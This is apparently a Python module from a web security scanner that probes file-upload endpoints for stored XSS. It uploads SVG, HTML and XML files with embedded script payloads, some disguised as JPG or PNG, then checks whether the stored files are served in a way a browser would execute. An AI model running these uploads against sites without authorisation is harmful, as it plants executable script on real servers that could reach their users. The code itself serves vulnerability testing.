"""
文件上传 XSS 检测 — P2 能力。

漏洞场景：
- 用户上传 SVG / HTML / PDF / SWF / Word 文件
- 服务端未严格校验 MIME / 后缀 / 内容
- 文件被存到可访问 URL（CDN / static 目录）
- 受害者直接访问该 URL → 浏览器渲染文件中的 JS

经典案例：
- SVG 内嵌 <script> 或 onload
- HTML 文件直接 <script>
- MIME 嗅探：上传 .jpg 但实际是 HTML（IE/旧 Chrome 嗅探后渲染）
- PDF 内 JS（Adobe Reader 内）
- XML 文件含 stylesheet → SSRF/XSS

工作流：
1. 在 sitemap 中找上传端点（multipart/form-data + file 字段名含 file/upload/image/avatar/document）
2. 上传 SVG/HTML 测试文件（含 marker）
3. 上传响应中提取返回的文件 URL（json/text 都尝试）
4. GET 该 URL → 检查 Content-Type 和响应体
5. 浏览器层渲染该 URL（验证是否真的执行）
"""

from __future__ import annotations

import asyncio
import json
import logging
import re
import time
import uuid
from typing import TYPE_CHECKING, Optional
from urllib.parse import urljoin, urlparse

import httpx

from core.xss.http_engine import _gen_marker
from core.xss.models import (
    ContextType,
    EchoMatch,
    InjectionPoint,
    InjectionTarget,
    XssCandidate,
    XssType,
)

if TYPE_CHECKING:
    from core.sitemap import Sitemap

log = logging.getLogger(__name__)


# ============================================================
# 测试用文件 payload
# ============================================================
def build_svg_payload(marker: str) -> bytes:
    """SVG 内嵌 XSS。"""
    return f'''<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="window.__upload_xss__='{marker}'">
  <script type="text/javascript">window.__upload_xss__='{marker}'; alert('{marker}');</script>
  <text x="10" y="20">XSS Test</text>
</svg>'''.encode("utf-8")


def build_html_payload(marker: str) -> bytes:
    return f'''<!DOCTYPE html>
<html><head><meta charset="utf-8"></head>
<body>
<script>window.__upload_xss__='{marker}'; alert('{marker}');</script>
<h1>{marker}</h1>
</body></html>'''.encode("utf-8")


def build_xml_payload(marker: str) -> bytes:
    return f'''<?xml version="1.0"?>
<?xml-stylesheet type="text/xml" href="#x"?>
<root xmlns:html="http://www.w3.org/1999/xhtml">
  <html:script>window.__upload_xss__='{marker}'; alert('{marker}');</html:script>
</root>'''.encode("utf-8")


# 测试文件配置 (filename, content_func, content_type)
TEST_FILES = [
    ("xss_test.svg", build_svg_payload, "image/svg+xml"),
    ("xss_test.html", build_html_payload, "text/html"),
    # 后缀混淆：服务端可能仅看后缀
    ("xss_test.jpg", build_html_payload, "image/jpeg"),  # HTML 内容伪装 JPG
    ("xss_test.png", build_svg_payload, "image/png"),  # SVG 内容伪装 PNG
    ("xss_test.xml", build_xml_payload, "application/xml"),
]


# 上传字段名候选（按可能性排序）
UPLOAD_FIELD_NAMES = ["file", "upload", "image", "avatar", "photo", "picture",
                      "attachment", "document", "media", "uploadFile", "fileToUpload"]


# ============================================================
# URL 提取（从上传响应中找文件 URL）
# ============================================================
_URL_RE = re.compile(
    r'(https?://[^\s"\'<>)]+|/[a-zA-Z0-9_./-]+\.(?:svg|html|htm|jpg|jpeg|png|gif|pdf|xml))',
    re.IGNORECASE,
)


def extract_file_urls_from_response(body: str, base_url: str) -> list[str]:
    """从上传响应中提取可能的文件访问 URL。"""
    urls: list[str] = []
    # JSON 解析
    try:
        obj = json.loads(body)
        urls.extend(_extract_urls_from_json(obj))
    except Exception:
        pass
    # 正则提取
    for m in _URL_RE.finditer(body or ""):
        u = m.group(0)
        if u.startswith("/"):
            u = urljoin(base_url, u)
        if u not in urls:
            urls.append(u)
    return urls[:10]


def _extract_urls_from_json(obj) -> list[str]:
    out: list[str] = []
    if isinstance(obj, dict):
        for k, v in obj.items():
            if isinstance(v, str):
                if any(ext in v.lower() for ext in [".svg", ".html", ".htm",
                                                      ".jpg", ".jpeg", ".png",
                                                      ".gif", ".pdf", ".xml"]):
                    out.append(v)
                elif v.startswith("http") or v.startswith("/"):
                    # 路径但无扩展名，仍尝试
                    if any(k.lower().endswith(hint) for hint in
                           ("url", "path", "src", "link", "file", "image", "location")):
                        out.append(v)
            else:
                out.extend(_extract_urls_from_json(v))
    elif isinstance(obj, list):
        for item in obj:
            out.extend(_extract_urls_from_json(item))
    return out


# ============================================================
# 上传 XSS 扫描器
# ============================================================
class UploadXssScanner:
    """文件上传 XSS 扫描器。"""

    def __init__(
        self,
        sitemap: "Sitemap",
        proxy: str = "",
        auth_headers: dict = None,
        cookies: dict = None,
        timeout: float = 30.0,
        on_progress: Optional[callable] = None,
        max_endpoints: int = 10,
    ):
        self.sitemap = sitemap
        self.proxy = proxy or None
        self.auth_headers = auth_headers or {}
        self.cookies = cookies or {}
        self.timeout = timeout
        self.on_progress = on_progress
        self.max_endpoints = max_endpoints

    def _report(self, msg: str):
        if self.on_progress:
            try:
                self.on_progress(msg)
            except Exception:
                pass

    async def scan(self) -> list[XssCandidate]:
        """主流程：发现上传端点 → 上传测试文件 → 验证返回 URL → 浏览器渲染。"""
        endpoints = self._find_upload_endpoints()
        if not endpoints:
            self._report("  无文件上传端点，跳过 Upload XSS 扫描")
            return []
        endpoints = endpoints[: self.max_endpoints]
        self._report(f"  📤 Upload XSS: 发现 {len(endpoints)} 个上传端点")

        candidates: list[XssCandidate] = []

        async with httpx.AsyncClient(
            proxy=self.proxy, timeout=self.timeout, verify=False,
            follow_redirects=True, headers=self.auth_headers, cookies=self.cookies,
            limits=httpx.Limits(max_connections=8),
        ) as client:
            for url, method, field_name in endpoints:
                for fname, content_func, ct in TEST_FILES:
                    marker = "upx" + _gen_marker("u")
                    try:
                        files = {field_name: (fname, content_func(marker), ct)}
                        resp = await client.request(method, url, files=files)
                        if resp.status_code >= 400 and resp.status_code != 401:
                            continue
                        body = resp.text or ""
                        # 提取返回的文件 URL
                        file_urls = extract_file_urls_from_response(body, url)
                        if not file_urls:
                            continue
                        # 取第一个 URL 尝试访问
                        for fu in file_urls[:3]:
                            try:
                                file_resp = await client.get(fu)
                                file_body = file_resp.text or ""
                                if marker not in file_body:
                                    continue
                                # 检查 Content-Type 是否允许浏览器执行
                                resp_ct = (file_resp.headers.get("content-type", "") or "").lower()
                                executable = (
                                    "html" in resp_ct or
                                    "svg" in resp_ct or
                                    "xml" in resp_ct or
                                    # 没有 X-Content-Type-Options: nosniff 时，浏览器可能 sniff
                                    not file_resp.headers.get("x-content-type-options", "").lower().startswith("nosniff")
                                )
                                confidence = 0.9 if executable else 0.6

                                target = InjectionTarget(
                                    url=fu,
                                    method="GET",
                                    injection_point=InjectionPoint.BODY_MULTIPART,
                                    param_name=field_name,
                                    original_value=fname,
                                    source_flow_id=f"upload_via:{method} {url}",
                                )
                                cand = XssCandidate(
                                    target=target,
                                    payload=f"[Upload {fname}] {content_func(marker)[:300].decode('utf-8', errors='replace')}",
                                    marker=marker,
                                    echo_matches=[EchoMatch(
                                        snippet=file_body[:500],
                                        context=ContextType.HTML_TEXT,
                                        encoded=False,
                                    )],
                                    confidence=confidence,
                                    xss_type=XssType.STORED,
                                    request_packet=(
                                        f"[上传] {method} {url}\n"
                                        f"文件名: {fname}, ContentType: {ct}\n"
                                        f"[访问] GET {fu}\n"
                                        f"返回 Content-Type: {resp_ct}\n"
                                        f"X-Content-Type-Options: {file_resp.headers.get('x-content-type-options', '<absent>')}"
                                    )[:8000],
                                    response_packet=file_body[:30000],
                                    response_status=file_resp.status_code,
                                    response_content_type=resp_ct,
                                    scanner="xss_upload",
                                )
                                candidates.append(cand)
                                break  # 该 payload 已命中
                            except Exception:
                                continue
                        if candidates and candidates[-1].marker == marker:
                            break  # 该端点已有结果，下一个端点
                    except Exception as e:
                        log.debug("upload scan error: %s", e)
                        continue

        if candidates:
            self._report(f"  ✅ Upload XSS: 发现 {len(candidates)} 个候选")
        return candidates

    def _find_upload_endpoints(self) -> list[tuple[str, str, str]]:
        """从 sitemap 找文件上传端点。返回 (url, method, field_name)。"""
        out: list[tuple[str, str, str]] = []
        seen: set[str] = set()

        # 1. api_samples：根据 content-type / 字段名识别
        samples = getattr(self.sitemap, "api_samples", {}) or {}
        for sample in samples.values():
            if not isinstance(sample, dict):
                continue
            url = sample.get("url", "")
            method = (sample.get("method", "POST") or "POST").upper()
            ct = ((sample.get("request_headers", {}) or {}).get("content-type", "") or "").lower()
            body = sample.get("request_body") or sample.get("post_data") or ""
            # 必须是 multipart
            if "multipart" not in ct and "form-data" not in ct:
                continue
            if method not in ("POST", "PUT", "PATCH"):
                continue
            # 找字段名（从 body 的 Content-Disposition 提取）
            field_name = None
            m = re.search(r'name="([^"]+)";\s*filename', body or "")
            if m:
                field_name = m.group(1)
            else:
                # 简单字段提取
                m2 = re.search(r'name="([^"]+)"', body or "")
                if m2 and any(hint in m2.group(1).lower() for hint in UPLOAD_FIELD_NAMES):
                    field_name = m2.group(1)
            if not field_name:
                # fallback: 尝试常见名
                field_name = "file"
            key = f"{method} {url} {field_name}"
            if key not in seen:
                seen.add(key)
                out.append((url, method, field_name))

        # 2. pages 中的 form (enctype=multipart/form-data)
        pages = getattr(self.sitemap, "pages", {}) or {}
        for purl, page in pages.items():
            if isinstance(page, dict):
                forms = page.get("forms", []) or []
            else:
                forms = getattr(page, "forms", []) or []
            for form in forms:
                if isinstance(form, dict):
                    enctype = (form.get("enctype", "") or "").lower()
                    action = form.get("action") or purl
                    method = (form.get("method", "POST") or "POST").upper()
                    inputs = form.get("inputs", []) or []
                else:
                    enctype = (getattr(form, "enctype", "") or "").lower()
                    action = getattr(form, "action", "") or purl
                    method = (getattr(form, "method", "POST") or "POST").upper()
                    inputs = getattr(form, "inputs", []) or []
                if "multipart" not in enctype:
                    continue
                for inp in inputs:
                    iname = inp.get("name", "") if isinstance(inp, dict) else getattr(inp, "name", "")
                    itype = inp.get("type", "") if isinstance(inp, dict) else getattr(inp, "type", "")
                    if itype == "file" or any(hint in iname.lower() for hint in UPLOAD_FIELD_NAMES):
                        if not iname:
                            continue
                        key = f"{method} {action} {iname}"
                        if key not in seen:
                            seen.add(key)
                            out.append((action, method, iname))

        return out
